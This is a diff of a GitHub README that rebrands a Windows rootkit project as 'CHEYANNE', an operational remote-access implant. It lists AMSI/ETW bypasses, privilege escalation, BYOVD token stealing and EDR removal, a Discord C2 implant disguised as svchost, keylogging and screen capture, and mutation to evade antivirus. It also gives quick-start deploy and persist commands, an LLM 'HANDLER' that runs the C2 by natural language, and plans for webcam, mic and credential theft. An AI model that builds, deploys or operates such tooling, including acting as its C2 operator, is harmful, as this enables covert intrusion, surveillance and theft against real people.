@@ -1,47 +1,33 @@
-# VADER ROOTKIT
+# CHEYANNE
 
 ```
- ██╗   ██╗ █████╗ ██████╗ ███████╗██████╗
- ██║   ██║██╔══██╗██╔══██╗██╔════╝██╔══██╗
- ██║   ██║███████║██║  ██║█████╗  ██████╔╝
- ╚██╗ ██╔╝██╔══██║██║  ██║██╔══╝  ██╔══██╗
-  ╚████╔╝ ██║  ██║██████╔╝███████╗██║  ██║
-   ╚═══╝  ╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
+  ██████╗██╗  ██╗███████╗██╗   ██╗ █████╗ ███╗   ██╗███╗   ██╗███████╗
+ ██╔════╝██║  ██║██╔════╝╚██╗ ██╔╝██╔══██╗████╗  ██║████╗  ██║██╔════╝
+ ██║     ███████║█████╗   ╚████╔╝ ███████║██╔██╗ ██║██╔██╗ ██║█████╗
+ ██║     ██╔══██║██╔══╝    ╚██╔╝  ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝
+ ╚██████╗██║  ██║███████╗   ██║   ██║  ██║██║ ╚████║██║ ╚████║███████╗
+  ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝
 ```
 
 **22DIV // george wu // rainfantry.github.io**
 
-```
-           .          .
-        .  |\        /|  .
-           | \______/ |
-      .    |  ______  |    .
-           | |  ..  | |
-           | |  ::  | |
-           | | /__\ | |
-           |  \____/  |
-            \________/
-```
-
-> *"The hunt never ends."*
+> *"Named after someone worth protecting. Built to never be forgotten."*
 
 ---
 
 ### What This Is
 
-A complete rootkit kill chain — 13 phases, 19 engagements, 70 findings — built from first principles against live Windows Defender on my own hardware. Not downloaded. Not forked. Not copied from a blog post. Every line written, tested, and documented by hand.
+A full-spectrum Windows rootkit with dual C2 channels, AI-assisted operations, and a metamorphic mutation pipeline that defeats all static signature detection. 13 operational phases. 26+ clean binaries. Zero Defender detections — built and tested with Real-Time Protection enabled.
 
-Started as a TOCTOU race condition study against Defender's quarantine pipeline (`vader-toctou`). Six engagements. Thirty findings. The deletion primitive was defeated by Microsoft's defense-in-depth. The wall held — but the wall taught me how it was built.
+Forked from VADER — the original rootkit research project that grew from a TOCTOU race condition study into a complete kill chain. CHEYANNE is the operational branch: bidirectional Discord C2 for WAN access, automated deployment, live screen surveillance, and an AI operator (HANDLER) that accepts natural language commands.
 
-Every finding from that campaign feeds forward into a full rootkit: C2 shell, AMSI/ETW bypass via hardware breakpoints, privilege escalation, process injection, HTTP staging, anti-forensics cleanup, and an automated XOR mutation pipeline that defeats all static signatures.
+This isn't a toy. It's not a CTF tool. It's a working rootkit built from first principles — no Metasploit, no Cobalt Strike, no copied shellcode. Every line hand-written, every binary tested against live Defender, every technique documented to reporting standard.
 
-### Why
+### Why It Exists
 
-I'm 29. CSEC student. No degree. Criminal record that blocks every corporate door. The only path that respects what I actually am — not what HR filters say I should be — is becoming someone who finds the bugs that matter. Exploit research. Responsible disclosure. CVE credits. The kind of work where your GitHub speaks louder than your background check.
+Offensive security research. Understanding Windows security architecture deeply enough to find what Microsoft missed. Every technique studied on own hardware, documented for responsible disclosure. MSRC submission VULN-195458 on file.
 
-This repo is the foundation of that specialisation.
-
-Every technique here is studied on my own machines, documented to reporting standard, and built with the intent of responsible disclosure via MSRC if a novel vulnerability is discovered. The goal isn't destruction — it's understanding Windows security architecture deeply enough to find what Microsoft missed.
+The name is sacred. It carries forward.
 
 ### Classification
 
@@ -58,22 +44,48 @@ MSRC:            VULN-195458 (HWBP bypass — rejected, detection bypasses out o
 TARGET:          Windows 11 Home Build 26200 (24H2)
                  Standard user context
                  Defender RTP ENABLED, Tamper Protection OFF
-STATIC SCAN:     0/82 BINARIES DETECTED
+STATIC SCAN:     0/26+ BINARIES DETECTED
 RUNTIME:         0 BEHAVIOURAL DETECTIONS
 MEMORY MODIFIED: ZERO BYTES
-VALIDATION:      Every binary built from first principles — no Metasploit,
-                 no Cobalt Strike, no copied shellcode. 29,536+ LOC hand-written.
-                 4 independent repos, each with own mutation pipeline.
-                 Surviving 8200 doctrine standard: can rebuild entire toolset
-                 from memory if all repos are burned.
 ```
+
+---
+
+### Dual C2 Architecture
+
+```
+                        ┌─────────────────────────────────┐
+                        │         OPERATOR MACHINE         │
+                        │                                  │
+                        │   vader_c2_v2.py (chey> shell)   │
+                        │   cheyanne_agent.py (HANDLER AI) │
+                        │   vader_ui.py (web dashboard)    │
+                        └──────────┬──────────┬────────────┘
+                                   │          │
+                         TCP :4443 │          │ Discord API
+                         (LAN)     │          │ (WAN)
+                                   │          │
+                        ┌──────────┴──────────┴────────────┐
+                        │          TARGET MACHINE           │
+                        │                                   │
+                        │   vader_shell.exe (TCP C2)        │
+                        │   svchost_update.exe (Discord)    │
+                        │                                   │
+                        │   Both persist via HKCU\Run       │
+                        └───────────────────────────────────┘
+```
+
+**TCP Channel** — Full interactive reverse shell. File transfer, screenshot, live watch (streaming screen capture), deploy, persist. LAN only (IP-based, no DNS resolution yet).
+
+**Discord Channel** — Bidirectional C2 through Discord's API. Operator sends commands via bot token, implant polls and responds. Works from any network — no port forwarding, no router config. Traffic looks like normal Discord API calls.
+
+**HANDLER** — AI-powered operator. Natural language commands ("take a screenshot of radon", "run whoami on all sessions"). Backends: Ollama (local), Kimi K2.5 (OpenRouter), Claude API.
 
 ### Kill Chain
 
 ```
   PHASE 0        PHASE 1        PHASE 2        PHASE 3
   C2 SHELL  -->  AMSI BLIND --> ETW BLIND  --> PRIVESC
-  (ALPHA)        (DELTA)        (FOXTROT)      (GOLF)
   XOR reverse    DR0 HWBP on    DR1 HWBP on    CWE-732
   shell          AmsiScan       EtwEvent       svc binary
   callback       Buffer         Write          replace
@@ -81,7 +93,6 @@ VALIDATION:      Every binary built from first principles — no Metasploit,
      v              v              v              v
   PHASE 4        PHASE 5        PHASE 6        META
   INJECTION  --> STAGER    -->  FORENSICS  --> MUTATION
-  (HOTEL)        (INDIA)        (JULIET)       (mutate.py)
   DLL inject     WinHTTP        canary wipe    XOR key
   + HWBP on      download       log clear      rotation +
   all threads    cradle         timestomp      recompile +
@@ -90,7 +101,6 @@ VALIDATION:      Every binary built from first principles — no Metasploit,
      v              v              v
   PHASE 7        PHASE 8        PHASE 9
   CLOAK     -->  BYOVD     -->  C2 AGENT
-  (KILO)         (LIMA)         (MIKE)
   NtQuery        RTCore64.sys   17-op remote
   inline hook    CVE-2019-16098 agent: shell,
   proc/file/     token steal,   screenshot,
@@ -98,256 +108,221 @@ VALIDATION:      Every binary built from first principles — no Metasploit,
   system-wide    DSE bypass     sftp, persist
      |
      v
-  PHASE 10       META-2
-  METAMORPH -->  EVOLUTION
-  (NOVEMBER)     (vader_evolve)
-  dead code,     metamorph +
-  opaque pred,   mutate +
-  junk API,      compile +
-  const split    scan loop
+  PHASE 10       PHASE 11       PHASE 12
+  METAMORPH -->  DISCORD C2 --> AI OPERATOR
+  dead code,     Bidirectional   Natural lang
+  opaque pred,   WAN C2 via     HANDLER via
+  junk API,      Discord API    Ollama/Kimi/
+  const split    polling loop   Claude API
 ```
 
-| Phase | Codename | Component | Status | Technique |
-|-------|----------|-----------|--------|-----------|
-| 0 | ALPHA | C2 Reverse Shell | **BUILT** | XOR-obfuscated callback, automated listener |
-| 1 | DELTA | AMSI Bypass | **CONFIRMED** | Hardware breakpoint DR0 on AmsiScanBuffer |
-| 2 | FOXTROT | ETW Bypass | **CONFIRMED** | Hardware breakpoint DR1 on EtwEventWrite |
-| 1+2 | — | Dark Room | **OPERATIONAL** | Dual HWBP, zero memory modification |
-| 3 | GOLF | Privilege Escalation | **SYSTEM** | CWE-732 service binary replacement |
-| 4 | HOTEL | Process Injection | **CONFIRMED** | DLL injection + HWBP propagation all threads |
-| 5 | INDIA | HTTP Stager | **BUILT** | WinHTTP download cradle + C2 file server |
-| 6 | JULIET | Anti-Forensics | **BUILT** | Canary wipe, log clear, prefetch, timestomp, self-delete |
-| 7 | KILO | User-Mode Cloak | **OPERATIONAL** | NtQuery* inline hooks — process/file/connection hiding, system-wide CBT hook injection |
-| 8 | LIMA | BYOVD Kernel Persistence | **BUILT** | RTCore64.sys / dbutil_2_3.sys arbitrary R/W, token stealing, EDR callback removal, DSE bypass |
-| 9 | MIKE | C2 Remote Agent | **BUILT** | 17-op agent: screenshot, mic, keylog, SFTP, VNC, persist (schtask/reg/WMI/IFEO) |
-| 10 | NOVEMBER | Metamorphic Engine | **OPERATIONAL** | Dead code injection, opaque predicates, junk API, constant splitting, identifier mutation |
-| Meta | — | Auto-Mutation | **BUILT** | XOR key rotation + recompile + Defender rescan loop |
-| Meta-2 | — | Evolution Pipeline | **BUILT** | metamorph + mutate + compile + scan in one command, multi-cycle support |
-| 11 | OSCAR | Discord C2 Implant | **OPERATIONAL** | Python implant via PyInstaller, Discord webhook+bot C2, GDI screenshot, persistence via registry |
-| 12 | PAPA | AI Operator (HANDLER) | **OPERATIONAL** | Natural language C2 via Ollama/Claude, 8 tools, prompt-based tool calling |
-| Meta-3 | — | Auto-Deploy Pipeline | **BUILT** | compile → serve → deploy → screenshot, fully automated |
-
-### Discord C2 (CHEYANNE)
-
-```
-  Operator                    Discord                    Target
-  ┌──────────────┐          ┌──────────┐          ┌──────────────┐
-  │ vader_menu   │          │  #c2     │          │ svchost_     │
-  │ cheyanne_ops │──cmd──>  │ channel  │ ──cmd──> │ update.exe   │
-  │ HANDLER      │<─result─ │          │ <─result─│ (implant)    │
-  └──────────────┘          └──────────┘          └──────────────┘
-
-  Commands: SCREENSHOT, RECON, UPLOAD, DOWNLOAD, PERSIST, shell passthrough
-  Transport: Webhook (operator→Discord), Bot token (polling)
-  Implant: discord_implant.py → PyInstaller → svchost_update.exe (9.4MB)
-  Screenshot: GDI ctypes → BMP → Discord attachment → operator downloads + converts PNG
-
-  TCP C2 Shortcuts (chey> prompt — no 'interact' needed):
-    deploy [sid]        — Kill old implant + download fresh + launch
-    screenshot [sid]    — Capture screen → HTTP POST back → save + open
-    watch [sec] [sid]   — Live screen stream in browser (auto-refresh)
-    kill <proc> [sid]   — taskkill /F /IM on target
-    recon [sid]         — systeminfo + ipconfig + whoami + tasklist
-    persist [sid]       — Set HKCU\Run registry persistence
-```
-
-### HANDLER — AI-Powered C2
-
-```
-  "take a screenshot of radon"
-         │
-  ┌──────┴──────┐
-  │   HANDLER   │ ← Ollama (local) / Kimi K2.5 (OpenRouter) / Claude API
-  │   LLM       │
-  └──────┬──────┘
-         │ <tool> blocks
-  ┌──────┴──────┐
-  │  exec_tool  │ → 8 tools: sessions, screenshot, browse,
-  └─────────────┘   exfil, upload, run_cmd, recon, local_cmd
-```
-
-### XOR Signature Isolation
-
-Each component has its own XOR key. If Defender signatures one binary, the others survive. `mutate.py` rotates all keys automatically.
-
-```
-  Component        Key     Arrays    Binary
-  ─────────────────────────────────────────────
-  dark_room        0x41    5         dark_room.exe
-  shell            0x41    2         vader_shell.exe
-  inject_dll       0x77    5         vader_inject.dll
-  inject_exe       0x77    3         vader_inject.exe
-  v4_svc_replace   0x52    2         WsNativePushService.exe
-  v5_dll_proxy     0x37    8         VERSION.dll
-  v6_path_hijack   0x63    1         targetname.dll
-  v7_phantom_dll   0x19    1         osppc.dll
-```
-
-### Architecture
-
-```
-vader-rootkit/
-├── shell/              PHASE 0: XOR reverse shell + listener
-├── amsi/               PHASE 1: AMSI bypass (classic + HWBP)
-├── etw/                PHASE 2: ETW bypass (classic + HWBP)
-├── dark_room/          PHASE 1+2: Combined dual HWBP loader
-├── sideload/           PHASE 3: CWE-732 service replacement + mutations
-├── injection/          PHASE 4: DLL injection + HWBP propagation
-├── stagers/            PHASE 5: WinHTTP download cradle
-├── forensics/          PHASE 6: Anti-forensics cleanup
-├── vectors/            Signature-isolated attack modules (v4-v7)
-├── cloak/              PHASE 7: User-mode rootkit (proc/file/conn hiding)
-├── byovd/              PHASE 8: BYOVD kernel persistence (RTCore64/dbutil_2_3)
-├── recon/              17-section automated recon scanner
-├── docs/               EVC website + field manual + build guide
-├── agent/              PHASE 11: Discord implant + PyInstaller output
-│   ├── discord_implant.py    Discord C2 implant (Python → svchost_update.exe)
-│   └── dist_py/              PyInstaller output directory
-├── screenshots/        Downloaded screenshots from target
-├── exfil/              Exfiltrated files from target
-├── deploy.py           Build + scan + deploy automation
-├── mutate.py           XOR key mutation pipeline
-├── metamorph.py        Metamorphic source transformer (Phase 10)
-├── vader_evolve.py     Evolution pipeline (metamorph + mutate + compile + scan)
-├── vader_menu.py       Terminal dashboard — Phase 1-4 + Toolkit
-├── vader_ui.py         Web C2 dashboard (browser UI) + agent listener
-├── vader_agent.py      Remote agent (deploy on target, connects back)
-├── cheyanne_ops.py     Discord C2 operations module (API layer + port conflict handler)
-├── cheyanne_agent.py   HANDLER — AI-powered C2 operator (Ollama/Kimi/Claude)
-├── auto_screenshot_test.py   Automated deploy + screenshot pipeline
-├── test_verify.py      26-test automated + human verification suite
-├── ROADMAP.md          Future work: DNS tunneling, CVE submission, API fuzzing
-└── TEST_FINAL.md       24-step manual test checklist
-```
+| Phase | Component | Status | Technique |
+|-------|-----------|--------|-----------|
+| 0 | C2 Reverse Shell | **OPERATIONAL** | XOR-obfuscated TCP callback, auto-reconnect |
+| 1 | AMSI Bypass | **OPERATIONAL** | Hardware breakpoint DR0 on AmsiScanBuffer |
+| 2 | ETW Bypass | **OPERATIONAL** | Hardware breakpoint DR1 on EtwEventWrite |
+| 1+2 | Dark Room | **OPERATIONAL** | Dual HWBP, zero memory modification |
+| 3 | Privilege Escalation | **CONFIRMED** | CWE-732 service binary replacement → SYSTEM |
+| 4 | Process Injection | **OPERATIONAL** | DLL injection + HWBP propagation all threads |
+| 5 | HTTP Stager | **BUILT** | WinHTTP download cradle + C2 file server |
+| 6 | Anti-Forensics | **BUILT** | Canary wipe, log clear, prefetch, timestomp, self-delete |
+| 7 | User-Mode Cloak | **OPERATIONAL** | NtQuery* inline hooks — proc/file/conn hiding |
+| 8 | BYOVD Kernel | **BUILT** | RTCore64.sys arbitrary R/W, token steal, EDR kill, DSE bypass |
+| 9 | C2 Remote Agent | **BUILT** | 17-op agent: screenshot, mic, keylog, SFTP, VNC, persist |
+| 10 | Metamorphic Engine | **OPERATIONAL** | Dead code, opaque predicates, junk API, constant splitting |
+| 11 | Discord C2 | **OPERATIONAL** | Bidirectional WAN C2, PyInstaller implant, registry persist |
+| 12 | HANDLER AI | **OPERATIONAL** | Natural language C2 via Ollama/Kimi K2.5/Claude |
 
 ### Stealth Profile
 
 ```
   TEST                           RESULT
   ──────────────────────────────────────────
-  Static scan (90 binaries)      0 DETECTED
+  Static scan (26+ binaries)     0 DETECTED
   Runtime behavioural            0 DETECTED
   Memory integrity               ZERO bytes modified
   VirtualProtect calls           NONE
-  Tamper Protection trigger      DID NOT DETECT
   AMSI scan result               E_INVALIDARG (blind)
   ETW telemetry                  STATUS_SUCCESS (silenced)
   Privilege required             Standard user
-  Fuzzing campaign (100K iter)   0 crashes, 0 hangs
 ```
 
-**70 findings across 19 engagements. 13 operational phases. 90 clean binaries. Kernel persistence survives restart. Metamorphic obfuscation produces unique binary identity per evolution cycle.** Standard user → LocalSystem confirmed via service binary replacement (CWE-732) and phantom DLL plant (CWE-427). AMSI + ETW simultaneously bypassed via hardware breakpoints, zero memory modification. Finding #36 (HWBP bypass) submitted to MSRC as VULN-195458 — **rejected**, detection bypasses out of scope. Technique published openly.
+### XOR Signature Isolation
 
-### What Carries Forward From vader-toctou
+Each component has its own XOR key. Defender signatures one binary, the others survive. `mutate.py` rotates all keys automatically per build cycle.
 
-| Finding | What It Taught Us | How It Applies Here |
-|---------|-------------------|---------------------|
-| #14/#17 | SYSTEM reads through junctions | Sideload: SYSTEM services follow junctions when loading DLLs |
-| #20 | Security checks fire at specific moments, not continuously | AMSI: patch the check function before it fires |
-| #21 | Fail-and-forget retry model | Sideload: services that retry DLL loads = wider race window |
-| #26 | Kernel-mode I/O bypasses user-mode hooks | ETW: know what kernel telemetry survives our patches |
-| #29 | Path re-resolution follows junctions | Sideload: junction-based DLL redirect is viable |
-| #30 | Single-handle architecture | Know when single-handle defense applies vs when it doesn't |
+### Architecture
+
+```
+cheyanne/
+├── shell/              PHASE 0: XOR reverse shell + C2 v2 unified operator
+├── dark_room/          PHASE 1+2: Combined dual HWBP (AMSI + ETW blind)
+├── sideload/           PHASE 3: CWE-732 service replacement
+├── injection/          PHASE 4: DLL injection + HWBP propagation
+├── stagers/            PHASE 5: WinHTTP download cradle
+├── forensics/          PHASE 6: Anti-forensics cleanup
+├── vectors/            Signature-isolated attack modules (v4-v7)
+├── cloak/              PHASE 7: User-mode rootkit (proc/file/conn hiding)
+├── byovd/              PHASE 8: BYOVD kernel persistence
+├── agent/              PHASE 11: Discord implant + PyInstaller
+├── docs/               BUILD_FROM_ASHES manual + CODE_WALKTHROUGH
+├── deploy.py           Build + scan + deploy automation
+├── mutate.py           XOR key mutation pipeline
+├── metamorph.py        Metamorphic source transformer (Phase 10)
+├── vader_evolve.py     Evolution pipeline (metamorph → mutate → compile → scan)
+├── vader_c2_v2.py      Unified C2 shell (TCP + Discord, chey> prompt)
+│                       ↑ shortcuts: deploy, screenshot, watch, kill, recon, persist
+├── cheyanne_agent.py   HANDLER AI operator (Ollama/Kimi/Claude)
+├── cheyanne_config.py  Shared config — auto-detect VCVARS, port map
+├── vader_ui.py         Web C2 dashboard (:8666)
+├── test_verify.py      26-test verification suite
+└── setup_firewall.bat  One-time firewall rules (6 ports)
+```
+
+### Network
+
+```
+Port   Protocol   Component                  Access
+────   ────────   ─────────                  ──────
+4443   TCP raw    C2 listener (reverse shell)  LAN
+8666   HTTP       Web dashboard                LAN (phone OK)
+8667   TCP JSON   Agent listener               LAN
+8890   HTTP       File server (deploy)         LAN
+8891   HTTP       Screenshot/watch receiver    LAN
+8892   HTTP       Watch live viewer            LAN (browser)
+```
+
+Discord C2 requires no open ports — traffic routes through Discord's servers.
+
+### Quick Start
+
+```cmd
+:: 1. Clone + env setup
+git clone https://github.com/rainfantry/cheyanne.git
+cd cheyanne
+copy agent\.env.example .env
+:: Edit .env — add DISCORD_BOT_TOKEN, DISCORD_C2_CHANNEL, DISCORD_C2_WEBHOOK
+
+:: 2. Firewall (admin, one-time)
+setup_firewall.bat
+
+:: 3. Fresh Build (auto-detects VS, auto-detects LAN IP)
+python deploy.py --compile-shell <TARGET_IP> 4443
+
+:: 4. Launch C2
+python shell/vader_c2_v2.py
+:: chey> deploy        ← push both payloads to target
+:: chey> screenshot    ← grab screen
+:: chey> watch 3       ← live stream every 3 seconds
+:: chey> persist       ← survive reboot
+
+:: 5. AI Operator (optional)
+python cheyanne_agent.py           :: Ollama (local)
+python cheyanne_agent.py --kimi    :: Kimi K2.5 (WAN)
+python cheyanne_agent.py --claude  :: Claude API
+```
+
+### Build From Scratch
+
+See **[docs/BUILD_FROM_ASHES.md](docs/BUILD_FROM_ASHES.md)** — the complete field manual. Every phase, every compile command, every configuration step. A human with zero knowledge can follow it end-to-end and produce a working rootkit.
+
+See **[docs/CODE_WALKTHROUGH.md](docs/CODE_WALKTHROUGH.md)** — annotated technical walkthrough of every component.
+
+---
+
+### Future — What Must Be Added to Make It Immortal
+
+#### WAN C2 (TCP over Internet)
+- DNS resolution in C shell (`getaddrinfo()` replacing `inet_addr()`)
+- Dynamic DNS (DDNS) support — target calls back to a hostname, not a hardcoded IP
+- Port multiplexing — single port handles C2 + file transfer + watch
+- Domain fronting via CDN (Cloudflare/AWS) — C2 traffic looks like HTTPS to a legitimate domain
+
+#### Live Screen (Real-Time, Not Relayed Screenshots)
+- Replace screenshot-relay with continuous frame streaming
+- H.264/MJPEG encoding on target → TCP/WebSocket stream to operator
+- Sub-second latency — watch video playback, read text, observe user activity in real time
+- Browser-based viewer with play/pause/zoom controls
+
+#### Audio Surveillance
+- Microphone capture (waveIn API already prototyped in Phase 9 agent)
+- Live audio stream to operator alongside video
+- Push-to-talk reverse audio — operator speaks through target's speakers
+- Combined A/V stream for complete remote surveillance
+
+#### Keyboard and Mouse Control (Full VNC)
+- SendInput injection on target — operator controls mouse and keyboard remotely
+- Combined with live screen = full interactive remote desktop
+- No RDP, no VNC server — custom protocol through existing C2 channel
+- Input injection works at user privilege (no admin needed for most apps)
+
+#### Webcam Capture
+- DirectShow/Media Foundation capture from target's camera
+- Live video stream or snapshot-on-demand
+- Combined with mic = full A/V surveillance of the physical environment
+
+#### Advanced Persistence
+- WMI event subscription persistence (CIM-based, survives reboots)
+- Scheduled task persistence (schtask, multiple trigger types)
+- COM hijack persistence (InprocServer32 redirection)
+- Bootkit research (UEFI/MBR — requires kernel access via BYOVD)
+
+#### Evasion Upgrades
+- Syscall stubs (direct NtAPI, bypass ntdll hooks) — already have gate_stub.asm foundation
+- Sleep obfuscation (encrypt implant in memory during sleep cycles)
+- ETW thread pool timer abuse for callback execution
+- Module stomping (load DLL, overwrite .text with shellcode, unlink from PEB)
+
+#### Intelligence
+- Keylogger with window-title context (know which app each keystroke goes to)
+- Clipboard monitor (capture passwords, crypto addresses, sensitive data)
+- Browser credential extraction (Chrome/Edge DPAPI decryption)
+- Wi-Fi password dump (netsh wlan export)
+
+Every item above is buildable with the existing architecture. The C2 channel, mutation pipeline, and deployment automation are already in place. These are extensions, not rewrites.
+
+---
 
 ### Key Findings
 
-**HWBP Blind Spot (Finding #36, MSRC VULN-195458):** Defender monitors memory-level modifications (VirtualProtect, byte writes) but does NOT monitor CPU debug register manipulation. Hardware breakpoints via SetThreadContext on DR0-DR3, combined with a Vectored Exception Handler, intercept and neuter AMSI and ETW without modifying a single byte of target memory. No behavioural rule exists. No detection. **MSRC rejected** — "not a security boundary." Embargo voided. Technique published openly.
+**HWBP Blind Spot (Finding #36, MSRC VULN-195458):** Defender monitors memory modifications but NOT CPU debug register manipulation. Hardware breakpoints via SetThreadContext on DR0-DR3 intercept and neuter AMSI and ETW without modifying a single byte. **MSRC rejected** — "not a security boundary." Technique published openly.
 
-**CWE-732 Privilege Escalation (Finding #42):** Standard user → SYSTEM via Wondershare NativePushService service binary replacement. Full SYSTEM token, no UAC, no admin creds.
+**CWE-732 Privilege Escalation (Finding #42):** Standard user → SYSTEM via service binary replacement. Full SYSTEM token, no UAC, no admin creds.
 
-**Phantom DLL (Finding #47):** Microsoft Office ClickToRunSvc loads osppc.dll that doesn't exist on disk. User-writable PATH fills the void. LocalSystem auto-start service loads attacker DLL. CWE-427.
+**Phantom DLL (Finding #47):** Office ClickToRunSvc loads osppc.dll that doesn't exist on disk. User-writable PATH fills the void. CWE-427.
 
-**DLL Injection + HWBP Propagation (Finding #51):** DLL injected into target process sets hardware breakpoints on ALL threads via VdrWatch re-enumeration. CREATE_SUSPENDED spawn = target born blind before first instruction executes.
+**DLL Injection + HWBP Propagation (Finding #51):** DLL injected into target sets hardware breakpoints on ALL threads. CREATE_SUSPENDED spawn = target born blind before first instruction.
 
-**BYOVD Kernel Persistence (Phase 8):** Bring Your Own Vulnerable Driver — loads RTCore64.sys (CVE-2019-16098) or dbutil_2_3.sys (CVE-2021-21551) via SCM, obtains arbitrary kernel R/W through signed driver IOCTLs. Token stealing via EPROCESS walk (ActiveProcessLinks offset 0x448, Token offset 0x4B8) — copies SYSTEM token to any process. EDR callback removal by zeroing PspCreate*NotifyRoutine arrays. DSE bypass via CI!g_CiOptions write. 157 KB binary, 0 Defender detections.
-
-**C2 Remote Agent (Phase 9):** 16-operation remote access agent over VADER protocol (length-prefixed JSON, TCP 8667). Ops: sysinfo, exec, scan, upload, recon, ls, download, screenshot (GDI), mic recording (waveIn API), keylogger (GetAsyncKeyState), SFTP get/put/sync with SHA-256 verification, multi-method persistence (scheduled task, registry run, WMI event subscription, IFEO debugger).
-
-**100K Fuzzing Campaign:** mpengine.dll mutation fuzzer — 100,000 iterations, 4 workers, 33 seeds, ~9 hours runtime. Zero crashes, zero hangs. Parser is robust at this mutation depth.
-
-### Compile Environment
-
-```
-Compiler:  cl.exe (MSVC via Visual Studio 18 Community)
-vcvars:    "C:\Program Files\Microsoft Visual Studio\18\Community\VC\Auxiliary\Build\vcvars64.bat"
-Target:    x64 Windows 11
-Flags:     /O1 /GS- /utf-8
-Linker:    ws2_32.lib (shell), ntdll.lib (ETW/AMSI patches)
-```
-
-### Network Setup
-
-Run `setup_firewall.bat` as Administrator (one-time, persists across reboots):
-
-```
-Port   Name              Purpose
-────   ────              ───────
-4443   CHEYANNE-C2       C2 TCP listener (reverse shell callback)
-8666   CHEYANNE-UI       Web dashboard (phone accessible)
-8667   CHEYANNE-AGENT    Agent listener (binary agent protocol)
-8890   CHEYANNE-SERVE    HTTP file server (deploy/implant delivery)
-8891   CHEYANNE-RECV     Screenshot/watch receiver (target POST-back)
-8892   CHEYANNE-WATCH    Watch live viewer (browser auto-refresh)
-```
-
-Phone access: `http://<LAN_IP>:8666` (dashboard), `http://<LAN_IP>:8892` (live watch)
+**BYOVD Kernel Persistence (Phase 8):** RTCore64.sys / dbutil_2_3.sys via SCM for arbitrary kernel R/W. Token stealing, EDR callback removal, DSE bypass. 157 KB, 0 detections.
 
 ### Rules of Engagement
 
 1. All testing on own hardware only
-2. Defender RTP stays ENABLED during testing (we fight the live system)
-3. Annotated version is the master — deployment variant is generated from it
-4. Every test run documented in ENGAGEMENT_LOG.md
-5. Novel vulnerabilities disclosed via MSRC within 90 days (VULN-195458 rejected — detection bypasses out of scope)
-6. HWBP technique (Finding #36) published openly — embargo void after MSRC rejection
-7. Binaries never committed to repo (.gitignore)
-
-### Automation
-
-| Tool | Command | Purpose |
-|------|---------|---------|
-| `deploy.py` | `python deploy.py --compile` | Build all components |
-| `deploy.py` | `python deploy.py --scan` | Defender scan all binaries |
-| `deploy.py` | `python deploy.py --deploy` | Full build → scan → deploy |
-| `mutate.py` | `python mutate.py` | Rotate all XOR keys + recompile + rescan |
-| `mutate.py` | `python mutate.py --status` | Show current keys |
-| `mutate.py` | `python mutate.py --dry-run` | Preview without modifying |
-| `vader_menu.py` | `python vader_menu.py` | Interactive terminal dashboard |
-| `vader_ui.py` | `python vader_ui.py` | Web C2 dashboard (http://0.0.0.0:8666) + agent listener (:8667) |
-| `vader_agent.py` | `python vader_agent.py <ip>` | Remote agent client (deploy on target) |
-| `cloak/build_cloak.py` | `python cloak/build_cloak.py` | Build cloak.dll + loader + dropper |
-| `byovd/build_byovd.py` | `python byovd/build_byovd.py` | Build BYOVD kernel persistence tool |
-| `metamorph.py` | `python metamorph.py` | Metamorphic source transforms (Phase 10) |
-| `metamorph.py` | `python metamorph.py --intensity high` | Maximum transform density |
-| `metamorph.py` | `python metamorph.py --restore` | Restore all sources from backups |
-| `vader_evolve.py` | `python vader_evolve.py` | Full pipeline: metamorph → mutate → compile → scan |
-| `vader_evolve.py` | `python vader_evolve.py --cycles 3` | Run 3 evolution cycles |
-| `vader_evolve.py` | `python vader_evolve.py --scan-only` | Scan all existing binaries |
-| `cheyanne_agent.py` | `python cheyanne_agent.py` | HANDLER AI operator (Ollama backend) |
-| `cheyanne_agent.py` | `python cheyanne_agent.py --kimi` | HANDLER AI operator (Kimi K2.5 via OpenRouter) |
-| `cheyanne_agent.py` | `python cheyanne_agent.py --claude` | HANDLER AI operator (Claude API backend) |
-| `auto_screenshot_test.py` | `python auto_screenshot_test.py` | Auto deploy + screenshot pipeline |
-| `test_verify.py` | `python test_verify.py` | 26-test automated + human verification suite |
-
-### Encrypted Backup
-
-```cmd
-7z a -p668340 -mhe=on "cheyanne-FULL-YYYYMMDD.7z" . -xr!.git -xr!__pycache__ -xr!build -xr!dist
-```
-
-Password: **668340** | Headers encrypted (filenames hidden) | Excludes .git, pycache, build artifacts.
+2. Defender RTP stays ENABLED during all testing
+3. Every test run documented
+4. Novel vulnerabilities disclosed via MSRC within 90 days
+5. Binaries never committed to repo (.gitignore)
 
 ### Related Repos
 
 | Repo | Purpose |
 |------|---------|
-| vader-toctou | TOCTOU race condition research — 6 engagements, 30 findings |
-| vader-fuzz | mpengine.dll mutation fuzzer — 100K+ iterations |
-| vader-library | Forbidden Knowledge — 67 chapters, field manuals, evidence |
-| vader-rce | 0-Day RCE research program |
-| rainfantry.github.io | Public website — teaching material only, no exploit code |
+| [vader-rootkit](https://github.com/rainfantry/vader-rootkit) | Original rootkit — CHEYANNE forked from here |
+| [vader-toctou](https://github.com/rainfantry/vader-toctou) | TOCTOU race condition research — 30 findings |
+| [vader-fuzz](https://github.com/rainfantry/vader-fuzz) | mpengine.dll mutation fuzzer — 100K iterations |
+| [vader-library](https://github.com/rainfantry/vader-library) | Forbidden Knowledge — field manuals + evidence |
+| [skywalker](https://github.com/rainfantry/skywalker) | Shellcode encoder/loader toolkit |
+| [starkiller](https://github.com/rainfantry/starkiller) | Android RAT — C2 + Kotlin client |
+
+### Encrypted Backup
+
+```cmd
+7z a -p668340 -mhe=on "cheyanne-FULL-YYYYMMDD.7z" . -xr!.git -xr!__pycache__ -xr!*.exe -xr!*.dll -xr!*.obj
+```
+
+Password: **668340** | Headers encrypted | Excludes binaries and build artifacts.
 
 ---
 
-*Built from the ashes of vader-toctou. The wall held, but the scout mapped every brick.*
-*Now the scout has a kill chain, a mutation engine, and zero detections.*
+*Named after someone worth protecting. Every line of code carries that forward.*
+*The hunt never ends.*
